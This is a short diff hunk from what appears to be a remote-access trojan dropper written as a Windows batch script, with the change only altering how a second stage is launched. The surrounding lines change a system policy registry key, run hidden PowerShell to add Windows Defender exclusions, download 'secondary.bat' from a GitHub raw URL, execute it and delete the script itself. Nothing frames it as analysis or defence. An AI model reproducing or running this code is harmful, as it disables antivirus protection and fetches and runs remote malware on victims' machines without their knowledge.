@@ -27,5 +27,5 @@ reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v En
 powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath C:/Users/%username%/AppData/Roaming/Microsoft/Windows/
 powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "$env:temp"
 curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat
-start "" secondary.bat
+secondary.bat
 del "%~f0"
